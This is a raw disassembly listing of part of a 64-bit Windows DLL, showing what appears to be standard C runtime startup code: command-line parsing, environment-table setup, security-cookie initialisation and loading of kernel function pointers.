   180009722:	74 1b                	je     0x18000973f
   180009724:	85 ed                	test   %ebp,%ebp
   180009726:	75 af                	jne    0x1800096d7
   180009728:	40 80 fe 20          	cmp    $0x20,%sil
   18000972c:	74 06                	je     0x180009734
   18000972e:	40 80 fe 09          	cmp    $0x9,%sil
   180009732:	75 a3                	jne    0x1800096d7
   180009734:	48 85 ff             	test   %rdi,%rdi
   180009737:	74 09                	je     0x180009742
   180009739:	c6 47 ff 00          	movb   $0x0,-0x1(%rdi)
   18000973d:	eb 03                	jmp    0x180009742
   18000973f:	48 ff cb             	dec    %rbx
   180009742:	33 f6                	xor    %esi,%esi
   180009744:	80 3b 00             	cmpb   $0x0,(%rbx)
   180009747:	0f 84 de 00 00 00    	je     0x18000982b
   18000974d:	80 3b 20             	cmpb   $0x20,(%rbx)
   180009750:	74 05                	je     0x180009757
   180009752:	80 3b 09             	cmpb   $0x9,(%rbx)
   180009755:	75 05                	jne    0x18000975c
   180009757:	48 ff c3             	inc    %rbx
   18000975a:	eb f1                	jmp    0x18000974d
   18000975c:	80 3b 00             	cmpb   $0x0,(%rbx)
   18000975f:	0f 84 c6 00 00 00    	je     0x18000982b
   180009765:	4d 85 ff             	test   %r15,%r15
   180009768:	74 07                	je     0x180009771
   18000976a:	49 89 3f             	mov    %rdi,(%r15)
   18000976d:	49 83 c7 08          	add    $0x8,%r15
   180009771:	41 ff 04 24          	incl   (%r12)
   180009775:	ba 01 00 00 00       	mov    $0x1,%edx
   18000977a:	33 c9                	xor    %ecx,%ecx
   18000977c:	eb 05                	jmp    0x180009783
   18000977e:	48 ff c3             	inc    %rbx
   180009781:	ff c1                	inc    %ecx
   180009783:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   180009786:	74 f6                	je     0x18000977e
   180009788:	80 3b 22             	cmpb   $0x22,(%rbx)
   18000978b:	75 35                	jne    0x1800097c2
   18000978d:	84 ca                	test   %cl,%dl
   18000978f:	75 1d                	jne    0x1800097ae
   180009791:	85 f6                	test   %esi,%esi
   180009793:	74 0e                	je     0x1800097a3
   180009795:	48 8d 43 01          	lea    0x1(%rbx),%rax
   180009799:	80 38 22             	cmpb   $0x22,(%rax)
   18000979c:	75 05                	jne    0x1800097a3
   18000979e:	48 8b d8             	mov    %rax,%rbx
   1800097a1:	eb 0b                	jmp    0x1800097ae
   1800097a3:	33 c0                	xor    %eax,%eax
   1800097a5:	33 d2                	xor    %edx,%edx
   1800097a7:	85 f6                	test   %esi,%esi
   1800097a9:	0f 94 c0             	sete   %al
   1800097ac:	8b f0                	mov    %eax,%esi
   1800097ae:	d1 e9                	shr    $1,%ecx
   1800097b0:	eb 10                	jmp    0x1800097c2
   1800097b2:	ff c9                	dec    %ecx
   1800097b4:	48 85 ff             	test   %rdi,%rdi
   1800097b7:	74 06                	je     0x1800097bf
   1800097b9:	c6 07 5c             	movb   $0x5c,(%rdi)
   1800097bc:	48 ff c7             	inc    %rdi
   1800097bf:	41 ff 06             	incl   (%r14)
   1800097c2:	85 c9                	test   %ecx,%ecx
   1800097c4:	75 ec                	jne    0x1800097b2
   1800097c6:	8a 03                	mov    (%rbx),%al
   1800097c8:	84 c0                	test   %al,%al
   1800097ca:	74 4c                	je     0x180009818
   1800097cc:	85 f6                	test   %esi,%esi
   1800097ce:	75 08                	jne    0x1800097d8
   1800097d0:	3c 20                	cmp    $0x20,%al
   1800097d2:	74 44                	je     0x180009818
   1800097d4:	3c 09                	cmp    $0x9,%al
   1800097d6:	74 40                	je     0x180009818
   1800097d8:	85 d2                	test   %edx,%edx
   1800097da:	74 34                	je     0x180009810
   1800097dc:	0f be c8             	movsbl %al,%ecx
   1800097df:	e8 e0 31 00 00       	call   0x18000c9c4
   1800097e4:	48 85 ff             	test   %rdi,%rdi
   1800097e7:	74 1a                	je     0x180009803
   1800097e9:	85 c0                	test   %eax,%eax
   1800097eb:	74 0d                	je     0x1800097fa
   1800097ed:	8a 03                	mov    (%rbx),%al
   1800097ef:	48 ff c3             	inc    %rbx
   1800097f2:	88 07                	mov    %al,(%rdi)
   1800097f4:	48 ff c7             	inc    %rdi
   1800097f7:	41 ff 06             	incl   (%r14)
   1800097fa:	8a 03                	mov    (%rbx),%al
   1800097fc:	88 07                	mov    %al,(%rdi)
   1800097fe:	48 ff c7             	inc    %rdi
   180009801:	eb 0a                	jmp    0x18000980d
   180009803:	85 c0                	test   %eax,%eax
   180009805:	74 06                	je     0x18000980d
   180009807:	48 ff c3             	inc    %rbx
   18000980a:	41 ff 06             	incl   (%r14)
   18000980d:	41 ff 06             	incl   (%r14)
   180009810:	48 ff c3             	inc    %rbx
   180009813:	e9 5d ff ff ff       	jmp    0x180009775
   180009818:	48 85 ff             	test   %rdi,%rdi
   18000981b:	74 06                	je     0x180009823
   18000981d:	c6 07 00             	movb   $0x0,(%rdi)
   180009820:	48 ff c7             	inc    %rdi
   180009823:	41 ff 06             	incl   (%r14)
   180009826:	e9 19 ff ff ff       	jmp    0x180009744
   18000982b:	4d 85 ff             	test   %r15,%r15
   18000982e:	74 04                	je     0x180009834
   180009830:	49 83 27 00          	andq   $0x0,(%r15)
   180009834:	41 ff 04 24          	incl   (%r12)
   180009838:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000983d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180009842:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180009847:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   18000984c:	48 83 c4 20          	add    $0x20,%rsp
   180009850:	41 5f                	pop    %r15
   180009852:	41 5e                	pop    %r14
   180009854:	41 5c                	pop    %r12
   180009856:	c3                   	ret
   180009857:	cc                   	int3
   180009858:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000985d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009862:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009867:	57                   	push   %rdi
   180009868:	48 83 ec 30          	sub    $0x30,%rsp
   18000986c:	83 3d 55 33 01 00 00 	cmpl   $0x0,0x13355(%rip)        # 0x18001cbc8
   180009873:	75 05                	jne    0x18000987a
   180009875:	e8 2e ea ff ff       	call   0x1800082a8
   18000987a:	48 8b 1d 87 0f 01 00 	mov    0x10f87(%rip),%rbx        # 0x18001a808
   180009881:	33 ff                	xor    %edi,%edi
   180009883:	48 85 db             	test   %rbx,%rbx
   180009886:	75 1c                	jne    0x1800098a4
   180009888:	83 c8 ff             	or     $0xffffffff,%eax
   18000988b:	e9 b5 00 00 00       	jmp    0x180009945
   180009890:	3c 3d                	cmp    $0x3d,%al
   180009892:	74 02                	je     0x180009896
   180009894:	ff c7                	inc    %edi
   180009896:	48 8b cb             	mov    %rbx,%rcx
   180009899:	e8 82 0e 00 00       	call   0x18000a720
   18000989e:	48 ff c3             	inc    %rbx
   1800098a1:	48 03 d8             	add    %rax,%rbx
   1800098a4:	8a 03                	mov    (%rbx),%al
   1800098a6:	84 c0                	test   %al,%al
   1800098a8:	75 e6                	jne    0x180009890
   1800098aa:	8d 47 01             	lea    0x1(%rdi),%eax
   1800098ad:	ba 08 00 00 00       	mov    $0x8,%edx
   1800098b2:	48 63 c8             	movslq %eax,%rcx
   1800098b5:	e8 8a 08 00 00       	call   0x18000a144
   1800098ba:	48 8b f8             	mov    %rax,%rdi
   1800098bd:	48 89 05 04 15 01 00 	mov    %rax,0x11504(%rip)        # 0x18001adc8
   1800098c4:	48 85 c0             	test   %rax,%rax
   1800098c7:	74 bf                	je     0x180009888
   1800098c9:	48 8b 1d 38 0f 01 00 	mov    0x10f38(%rip),%rbx        # 0x18001a808
   1800098d0:	80 3b 00             	cmpb   $0x0,(%rbx)
   1800098d3:	74 50                	je     0x180009925
   1800098d5:	48 8b cb             	mov    %rbx,%rcx
   1800098d8:	e8 43 0e 00 00       	call   0x18000a720
   1800098dd:	80 3b 3d             	cmpb   $0x3d,(%rbx)
   1800098e0:	8d 70 01             	lea    0x1(%rax),%esi
   1800098e3:	74 2e                	je     0x180009913
   1800098e5:	48 63 ee             	movslq %esi,%rbp
   1800098e8:	ba 01 00 00 00       	mov    $0x1,%edx
   1800098ed:	48 8b cd             	mov    %rbp,%rcx
   1800098f0:	e8 4f 08 00 00       	call   0x18000a144
   1800098f5:	48 89 07             	mov    %rax,(%rdi)
   1800098f8:	48 85 c0             	test   %rax,%rax
   1800098fb:	74 5d                	je     0x18000995a
   1800098fd:	4c 8b c3             	mov    %rbx,%r8
   180009900:	48 8b d5             	mov    %rbp,%rdx
   180009903:	48 8b c8             	mov    %rax,%rcx
   180009906:	e8 11 bc ff ff       	call   0x18000551c
   18000990b:	85 c0                	test   %eax,%eax
   18000990d:	75 64                	jne    0x180009973
   18000990f:	48 83 c7 08          	add    $0x8,%rdi
   180009913:	48 63 c6             	movslq %esi,%rax
   180009916:	48 03 d8             	add    %rax,%rbx
   180009919:	80 3b 00             	cmpb   $0x0,(%rbx)
   18000991c:	75 b7                	jne    0x1800098d5
   18000991e:	48 8b 1d e3 0e 01 00 	mov    0x10ee3(%rip),%rbx        # 0x18001a808
   180009925:	48 8b cb             	mov    %rbx,%rcx
   180009928:	e8 53 bc ff ff       	call   0x180005580
   18000992d:	48 83 25 d3 0e 01 00 	andq   $0x0,0x10ed3(%rip)        # 0x18001a808
   180009934:	00 
   180009935:	48 83 27 00          	andq   $0x0,(%rdi)
   180009939:	c7 05 89 32 01 00 01 	movl   $0x1,0x13289(%rip)        # 0x18001cbcc
   180009940:	00 00 00 
   180009943:	33 c0                	xor    %eax,%eax
   180009945:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000994a:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000994f:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180009954:	48 83 c4 30          	add    $0x30,%rsp
   180009958:	5f                   	pop    %rdi
   180009959:	c3                   	ret
   18000995a:	48 8b 0d 67 14 01 00 	mov    0x11467(%rip),%rcx        # 0x18001adc8
   180009961:	e8 1a bc ff ff       	call   0x180005580
   180009966:	48 83 25 5a 14 01 00 	andq   $0x0,0x1145a(%rip)        # 0x18001adc8
   18000996d:	00 
   18000996e:	e9 15 ff ff ff       	jmp    0x180009888
   180009973:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180009979:	45 33 c9             	xor    %r9d,%r9d
   18000997c:	45 33 c0             	xor    %r8d,%r8d
   18000997f:	33 d2                	xor    %edx,%edx
   180009981:	33 c9                	xor    %ecx,%ecx
   180009983:	e8 fc db ff ff       	call   0x180007584
   180009988:	cc                   	int3
   180009989:	cc                   	int3
   18000998a:	cc                   	int3
   18000998b:	cc                   	int3
   18000998c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180009991:	55                   	push   %rbp
   180009992:	48 8b ec             	mov    %rsp,%rbp
   180009995:	48 83 ec 20          	sub    $0x20,%rsp
   180009999:	48 8b 05 60 f6 00 00 	mov    0xf660(%rip),%rax        # 0x180019000
   1800099a0:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   1800099a5:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1800099ac:	2b 00 00 
   1800099af:	48 3b c3             	cmp    %rbx,%rax
   1800099b2:	75 6f                	jne    0x180009a23
   1800099b4:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1800099b8:	ff 15 92 77 00 00    	call   *0x7792(%rip)        # 0x180011150
   1800099be:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1800099c2:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1800099c6:	ff 15 cc 76 00 00    	call   *0x76cc(%rip)        # 0x180011098
   1800099cc:	8b c0                	mov    %eax,%eax
   1800099ce:	48 31 45 10          	xor    %rax,0x10(%rbp)
   1800099d2:	ff 15 70 77 00 00    	call   *0x7770(%rip)        # 0x180011148
   1800099d8:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800099dc:	8b c0                	mov    %eax,%eax
   1800099de:	48 31 45 10          	xor    %rax,0x10(%rbp)
   1800099e2:	ff 15 58 77 00 00    	call   *0x7758(%rip)        # 0x180011140
   1800099e8:	8b 45 20             	mov    0x20(%rbp),%eax
   1800099eb:	48 c1 e0 20          	shl    $0x20,%rax
   1800099ef:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800099f3:	48 33 45 20          	xor    0x20(%rbp),%rax
   1800099f7:	48 33 45 10          	xor    0x10(%rbp),%rax
   1800099fb:	48 33 c1             	xor    %rcx,%rax
   1800099fe:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180009a05:	ff 00 00 
   180009a08:	48 23 c1             	and    %rcx,%rax
   180009a0b:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180009a12:	2b 00 00 
   180009a15:	48 3b c3             	cmp    %rbx,%rax
   180009a18:	48 0f 44 c1          	cmove  %rcx,%rax
   180009a1c:	48 89 05 dd f5 00 00 	mov    %rax,0xf5dd(%rip)        # 0x180019000
   180009a23:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180009a28:	48 f7 d0             	not    %rax
   180009a2b:	48 89 05 d6 f5 00 00 	mov    %rax,0xf5d6(%rip)        # 0x180019008
   180009a32:	48 83 c4 20          	add    $0x20,%rsp
   180009a36:	5d                   	pop    %rbp
   180009a37:	c3                   	ret
   180009a38:	b8 01 00 00 00       	mov    $0x1,%eax
   180009a3d:	c3                   	ret
   180009a3e:	cc                   	int3
   180009a3f:	cc                   	int3
   180009a40:	48 8b c4             	mov    %rsp,%rax
   180009a43:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180009a47:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180009a4b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180009a4f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180009a53:	41 56                	push   %r14
   180009a55:	48 83 ec 40          	sub    $0x40,%rsp
   180009a59:	ff 15 f9 76 00 00    	call   *0x76f9(%rip)        # 0x180011158
   180009a5f:	45 33 f6             	xor    %r14d,%r14d
   180009a62:	48 8b f8             	mov    %rax,%rdi
   180009a65:	48 85 c0             	test   %rax,%rax
   180009a68:	0f 84 a9 00 00 00    	je     0x180009b17
   180009a6e:	48 8b d8             	mov    %rax,%rbx
   180009a71:	66 44 39 30          	cmp    %r14w,(%rax)
   180009a75:	74 14                	je     0x180009a8b
   180009a77:	48 83 c3 02          	add    $0x2,%rbx
   180009a7b:	66 44 39 33          	cmp    %r14w,(%rbx)
   180009a7f:	75 f6                	jne    0x180009a77
   180009a81:	48 83 c3 02          	add    $0x2,%rbx
   180009a85:	66 44 39 33          	cmp    %r14w,(%rbx)
   180009a89:	75 ec                	jne    0x180009a77
   180009a8b:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180009a90:	48 2b d8             	sub    %rax,%rbx
   180009a93:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180009a98:	48 d1 fb             	sar    $1,%rbx
   180009a9b:	4c 8b c0             	mov    %rax,%r8
   180009a9e:	33 d2                	xor    %edx,%edx
   180009aa0:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   180009aa4:	33 c9                	xor    %ecx,%ecx
   180009aa6:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180009aab:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180009ab0:	ff 15 2a 76 00 00    	call   *0x762a(%rip)        # 0x1800110e0
   180009ab6:	48 63 e8             	movslq %eax,%rbp
   180009ab9:	85 c0                	test   %eax,%eax
   180009abb:	74 51                	je     0x180009b0e
   180009abd:	48 8b cd             	mov    %rbp,%rcx
   180009ac0:	e8 ff 06 00 00       	call   0x18000a1c4
   180009ac5:	48 8b f0             	mov    %rax,%rsi
   180009ac8:	48 85 c0             	test   %rax,%rax
   180009acb:	74 41                	je     0x180009b0e
   180009acd:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180009ad2:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180009ad7:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   180009adb:	4c 8b c7             	mov    %rdi,%r8
   180009ade:	33 d2                	xor    %edx,%edx
   180009ae0:	33 c9                	xor    %ecx,%ecx
   180009ae2:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   180009ae6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180009aeb:	ff 15 ef 75 00 00    	call   *0x75ef(%rip)        # 0x1800110e0
   180009af1:	85 c0                	test   %eax,%eax
   180009af3:	75 0b                	jne    0x180009b00
   180009af5:	48 8b ce             	mov    %rsi,%rcx
   180009af8:	e8 83 ba ff ff       	call   0x180005580
   180009afd:	49 8b f6             	mov    %r14,%rsi
   180009b00:	48 8b cf             	mov    %rdi,%rcx
   180009b03:	ff 15 57 76 00 00    	call   *0x7657(%rip)        # 0x180011160
   180009b09:	48 8b c6             	mov    %rsi,%rax
   180009b0c:	eb 0b                	jmp    0x180009b19
   180009b0e:	48 8b cf             	mov    %rdi,%rcx
   180009b11:	ff 15 49 76 00 00    	call   *0x7649(%rip)        # 0x180011160
   180009b17:	33 c0                	xor    %eax,%eax
   180009b19:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180009b1e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180009b23:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180009b28:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180009b2d:	48 83 c4 40          	add    $0x40,%rsp
   180009b31:	41 5e                	pop    %r14
   180009b33:	c3                   	ret
   180009b34:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180009b39:	57                   	push   %rdi
   180009b3a:	48 83 ec 40          	sub    $0x40,%rsp
   180009b3e:	48 8b d9             	mov    %rcx,%rbx
   180009b41:	ff 15 21 76 00 00    	call   *0x7621(%rip)        # 0x180011168
   180009b47:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   180009b4e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180009b53:	45 33 c0             	xor    %r8d,%r8d
   180009b56:	48 8b cf             	mov    %rdi,%rcx
   180009b59:	ff 15 11 76 00 00    	call   *0x7611(%rip)        # 0x180011170
   180009b5f:	48 85 c0             	test   %rax,%rax
   180009b62:	74 32                	je     0x180009b96
   180009b64:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180009b6a:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180009b6f:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180009b74:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180009b79:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180009b7e:	4c 8b c8             	mov    %rax,%r9
   180009b81:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180009b86:	33 c9                	xor    %ecx,%ecx
   180009b88:	4c 8b c7             	mov    %rdi,%r8
   180009b8b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180009b90:	ff 15 e2 75 00 00    	call   *0x75e2(%rip)        # 0x180011178
   180009b96:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180009b9b:	48 83 c4 40          	add    $0x40,%rsp
   180009b9f:	5f                   	pop    %rdi
   180009ba0:	c3                   	ret
   180009ba1:	cc                   	int3
   180009ba2:	cc                   	int3
   180009ba3:	cc                   	int3
   180009ba4:	40 53                	rex push %rbx
   180009ba6:	56                   	push   %rsi
   180009ba7:	57                   	push   %rdi
   180009ba8:	48 83 ec 40          	sub    $0x40,%rsp
   180009bac:	48 8b d9             	mov    %rcx,%rbx
   180009baf:	ff 15 b3 75 00 00    	call   *0x75b3(%rip)        # 0x180011168
   180009bb5:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180009bbc:	33 ff                	xor    %edi,%edi
   180009bbe:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180009bc3:	45 33 c0             	xor    %r8d,%r8d
   180009bc6:	48 8b ce             	mov    %rsi,%rcx
   180009bc9:	ff 15 a1 75 00 00    	call   *0x75a1(%rip)        # 0x180011170
   180009bcf:	48 85 c0             	test   %rax,%rax
   180009bd2:	74 39                	je     0x180009c0d
   180009bd4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180009bda:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180009bdf:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180009be4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180009be9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180009bee:	4c 8b c8             	mov    %rax,%r9
   180009bf1:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180009bf6:	33 c9                	xor    %ecx,%ecx
   180009bf8:	4c 8b c6             	mov    %rsi,%r8
   180009bfb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180009c00:	ff 15 72 75 00 00    	call   *0x7572(%rip)        # 0x180011178
   180009c06:	ff c7                	inc    %edi
   180009c08:	83 ff 02             	cmp    $0x2,%edi
   180009c0b:	7c b1                	jl     0x180009bbe
   180009c0d:	48 83 c4 40          	add    $0x40,%rsp
   180009c11:	5f                   	pop    %rdi
   180009c12:	5e                   	pop    %rsi
   180009c13:	5b                   	pop    %rbx
   180009c14:	c3                   	ret
   180009c15:	cc                   	int3
   180009c16:	cc                   	int3
   180009c17:	cc                   	int3
   180009c18:	48 8b 05 81 2e 01 00 	mov    0x12e81(%rip),%rax        # 0x18001caa0
   180009c1f:	48 33 05 da f3 00 00 	xor    0xf3da(%rip),%rax        # 0x180019000
   180009c26:	74 03                	je     0x180009c2b
   180009c28:	48 ff e0             	rex.W jmp *%rax
   180009c2b:	48 ff 25 7e 75 00 00 	rex.W jmp *0x757e(%rip)        # 0x1800111b0
   180009c32:	cc                   	int3
   180009c33:	cc                   	int3
   180009c34:	48 8b 05 6d 2e 01 00 	mov    0x12e6d(%rip),%rax        # 0x18001caa8
   180009c3b:	48 33 05 be f3 00 00 	xor    0xf3be(%rip),%rax        # 0x180019000
   180009c42:	74 03                	je     0x180009c47
   180009c44:	48 ff e0             	rex.W jmp *%rax
   180009c47:	48 ff 25 7a 75 00 00 	rex.W jmp *0x757a(%rip)        # 0x1800111c8
   180009c4e:	cc                   	int3
   180009c4f:	cc                   	int3
   180009c50:	48 8b 05 59 2e 01 00 	mov    0x12e59(%rip),%rax        # 0x18001cab0
   180009c57:	48 33 05 a2 f3 00 00 	xor    0xf3a2(%rip),%rax        # 0x180019000
   180009c5e:	74 03                	je     0x180009c63
   180009c60:	48 ff e0             	rex.W jmp *%rax
   180009c63:	48 ff 25 4e 75 00 00 	rex.W jmp *0x754e(%rip)        # 0x1800111b8
   180009c6a:	cc                   	int3
   180009c6b:	cc                   	int3
   180009c6c:	48 8b 05 45 2e 01 00 	mov    0x12e45(%rip),%rax        # 0x18001cab8
   180009c73:	48 33 05 86 f3 00 00 	xor    0xf386(%rip),%rax        # 0x180019000
   180009c7a:	74 03                	je     0x180009c7f
   180009c7c:	48 ff e0             	rex.W jmp *%rax
   180009c7f:	48 ff 25 3a 75 00 00 	rex.W jmp *0x753a(%rip)        # 0x1800111c0
   180009c86:	cc                   	int3
   180009c87:	cc                   	int3
   180009c88:	48 83 ec 28          	sub    $0x28,%rsp
   180009c8c:	48 8b 05 2d 2e 01 00 	mov    0x12e2d(%rip),%rax        # 0x18001cac0
   180009c93:	48 33 05 66 f3 00 00 	xor    0xf366(%rip),%rax        # 0x180019000
   180009c9a:	74 07                	je     0x180009ca3
   180009c9c:	48 83 c4 28          	add    $0x28,%rsp
   180009ca0:	48 ff e0             	rex.W jmp *%rax
   180009ca3:	ff 15 e7 74 00 00    	call   *0x74e7(%rip)        # 0x180011190
   180009ca9:	b8 01 00 00 00       	mov    $0x1,%eax
   180009cae:	48 83 c4 28          	add    $0x28,%rsp
   180009cb2:	c3                   	ret
   180009cb3:	cc                   	int3
   180009cb4:	40 53                	rex push %rbx
   180009cb6:	48 83 ec 20          	sub    $0x20,%rsp
   180009cba:	8b 05 28 ff 00 00    	mov    0xff28(%rip),%eax        # 0x180019be8
   180009cc0:	33 db                	xor    %ebx,%ebx
   180009cc2:	85 c0                	test   %eax,%eax
   180009cc4:	79 2f                	jns    0x180009cf5
   180009cc6:	48 8b 05 bb 2e 01 00 	mov    0x12ebb(%rip),%rax        # 0x18001cb88
   180009ccd:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180009cd1:	48 33 05 28 f3 00 00 	xor    0xf328(%rip),%rax        # 0x180019000
   180009cd8:	74 11                	je     0x180009ceb
   180009cda:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180009cdf:	33 d2                	xor    %edx,%edx
   180009ce1:	ff d0                	call   *%rax
   180009ce3:	83 f8 7a             	cmp    $0x7a,%eax
   180009ce6:	8d 43 01             	lea    0x1(%rbx),%eax
   180009ce9:	74 02                	je     0x180009ced
   180009ceb:	8b c3                	mov    %ebx,%eax
   180009ced:	89 05 f5 fe 00 00    	mov    %eax,0xfef5(%rip)        # 0x180019be8
   180009cf3:	85 c0                	test   %eax,%eax
   180009cf5:	0f 9f c3             	setg   %bl
   180009cf8:	8b c3                	mov    %ebx,%eax
   180009cfa:	48 83 c4 20          	add    $0x20,%rsp
   180009cfe:	5b                   	pop    %rbx
   180009cff:	c3                   	ret
   180009d00:	40 53                	rex push %rbx
   180009d02:	48 83 ec 20          	sub    $0x20,%rsp
   180009d06:	48 8d 0d 03 8c 00 00 	lea    0x8c03(%rip),%rcx        # 0x180012910
   180009d0d:	ff 15 bd 74 00 00    	call   *0x74bd(%rip)        # 0x1800111d0
   180009d13:	48 8d 15 16 8c 00 00 	lea    0x8c16(%rip),%rdx        # 0x180012930
   180009d1a:	48 8b c8             	mov    %rax,%rcx
   180009d1d:	48 8b d8             	mov    %rax,%rbx
   180009d20:	ff 15 32 73 00 00    	call   *0x7332(%rip)        # 0x180011058
   180009d26:	48 8d 15 13 8c 00 00 	lea    0x8c13(%rip),%rdx        # 0x180012940
   180009d2d:	48 8b cb             	mov    %rbx,%rcx
   180009d30:	48 33 05 c9 f2 00 00 	xor    0xf2c9(%rip),%rax        # 0x180019000
   180009d37:	48 89 05 62 2d 01 00 	mov    %rax,0x12d62(%rip)        # 0x18001caa0
   180009d3e:	ff 15 14 73 00 00    	call   *0x7314(%rip)        # 0x180011058
   180009d44:	48 8d 15 fd 8b 00 00 	lea    0x8bfd(%rip),%rdx        # 0x180012948
   180009d4b:	48 33 05 ae f2 00 00 	xor    0xf2ae(%rip),%rax        # 0x180019000
   180009d52:	48 8b cb             	mov    %rbx,%rcx
   180009d55:	48 89 05 4c 2d 01 00 	mov    %rax,0x12d4c(%rip)        # 0x18001caa8
   180009d5c:	ff 15 f6 72 00 00    	call   *0x72f6(%rip)        # 0x180011058
   180009d62:	48 8d 15 ef 8b 00 00 	lea    0x8bef(%rip),%rdx        # 0x180012958
   180009d69:	48 33 05 90 f2 00 00 	xor    0xf290(%rip),%rax        # 0x180019000
   180009d70:	48 8b cb             	mov    %rbx,%rcx
   180009d73:	48 89 05 36 2d 01 00 	mov    %rax,0x12d36(%rip)        # 0x18001cab0
   180009d7a:	ff 15 d8 72 00 00    	call   *0x72d8(%rip)        # 0x180011058
   180009d80:	48 8d 15 e1 8b 00 00 	lea    0x8be1(%rip),%rdx        # 0x180012968
   180009d87:	48 33 05 72 f2 00 00 	xor    0xf272(%rip),%rax        # 0x180019000
   180009d8e:	48 8b cb             	mov    %rbx,%rcx
   180009d91:	48 89 05 20 2d 01 00 	mov    %rax,0x12d20(%rip)        # 0x18001cab8
   180009d98:	ff 15 ba 72 00 00    	call   *0x72ba(%rip)        # 0x180011058
   180009d9e:	48 8d 15 e3 8b 00 00 	lea    0x8be3(%rip),%rdx        # 0x180012988
   180009da5:	48 33 05 54 f2 00 00 	xor    0xf254(%rip),%rax        # 0x180019000
   180009dac:	48 8b cb             	mov    %rbx,%rcx
   180009daf:	48 89 05 0a 2d 01 00 	mov    %rax,0x12d0a(%rip)        # 0x18001cac0
   180009db6:	ff 15 9c 72 00 00    	call   *0x729c(%rip)        # 0x180011058
   180009dbc:	48 8d 15 d5 8b 00 00 	lea    0x8bd5(%rip),%rdx        # 0x180012998
   180009dc3:	48 33 05 36 f2 00 00 	xor    0xf236(%rip),%rax        # 0x180019000
   180009dca:	48 8b cb             	mov    %rbx,%rcx
   180009dcd:	48 89 05 f4 2c 01 00 	mov    %rax,0x12cf4(%rip)        # 0x18001cac8
   180009dd4:	ff 15 7e 72 00 00    	call   *0x727e(%rip)        # 0x180011058
   180009dda:	48 8d 15 cf 8b 00 00 	lea    0x8bcf(%rip),%rdx        # 0x1800129b0
   180009de1:	48 33 05 18 f2 00 00 	xor    0xf218(%rip),%rax        # 0x180019000
   180009de8:	48 8b cb             	mov    %rbx,%rcx
   180009deb:	48 89 05 de 2c 01 00 	mov    %rax,0x12cde(%rip)        # 0x18001cad0
   180009df2:	ff 15 60 72 00 00    	call   *0x7260(%rip)        # 0x180011058
   180009df8:	48 8d 15 c9 8b 00 00 	lea    0x8bc9(%rip),%rdx        # 0x1800129c8
   180009dff:	48 33 05 fa f1 00 00 	xor    0xf1fa(%rip),%rax        # 0x180019000
   180009e06:	48 8b cb             	mov    %rbx,%rcx
   180009e09:	48 89 05 c8 2c 01 00 	mov    %rax,0x12cc8(%rip)        # 0x18001cad8
   180009e10:	ff 15 42 72 00 00    	call   *0x7242(%rip)        # 0x180011058
   180009e16:	48 8d 15 c3 8b 00 00 	lea    0x8bc3(%rip),%rdx        # 0x1800129e0
